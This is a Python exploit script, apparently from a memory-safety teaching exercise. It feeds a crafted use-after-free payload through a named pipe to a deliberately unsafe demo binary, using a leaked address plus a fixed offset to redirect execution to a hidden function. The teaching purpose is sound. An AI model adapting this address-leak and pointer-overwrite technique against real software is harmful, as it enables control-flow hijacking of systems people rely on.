import os
import re
import signal
import subprocess

# This offset represents the "magic" offset
# required to access the secret function.
# This works for the program as compiled with gcc and -O2
# optimizations. This is brittle, and may fail for a binary
# created differently.
SECRET_OFFSET = 22

DATA_FILE = "data_2.bin"
PROCESS_NAME = "./use_after_free_2_unsafe"
HEX_PAT = re.compile("0x([A-Fa-f0-9]+)")

def main():
    os.mkfifo(DATA_FILE)
    try:
        process = subprocess.Popen(
            [PROCESS_NAME, DATA_FILE], bufsize = 1,
            text = True, errors = "backslashreplace",
            stdout = subprocess.PIPE, stderr = subprocess.STDOUT)

        f = open(DATA_FILE, "wb", buffering = 0)
        try:
            line = process.stdout.readline()
            print(line, end = "")

            # Turn address into bytes
            addr_match = HEX_PAT.search(line)
            addr = bytes.fromhex(addr_match.group(1).zfill(16))[::-1]

            # Calculate offset
            addr = (int.from_bytes(addr, "little") + SECRET_OFFSET) \
                   .to_bytes(8, "little")

            f.write(b"\x00" * 8 + addr + b"\x00" * 16)
            # f.write(b"\xff" * 32)

            f.write(b"\x00" * 16 * 10)
        except BrokenPipeError:
            print("Pipe Broken")
        finally:
            # Try printing out everything else from process
            print(process.stdout.read(), end = "")
            f.close()

        poll = process.wait()
        if poll != 0:
            try:
                poll_name = signal.Signals(-poll).name
            except ValueError:
                poll_name = "unknown"

            print(f"$ poll = {poll!r} ({poll_name})")
    finally:
        os.unlink(DATA_FILE)

if __name__ == "__main__":
    main()
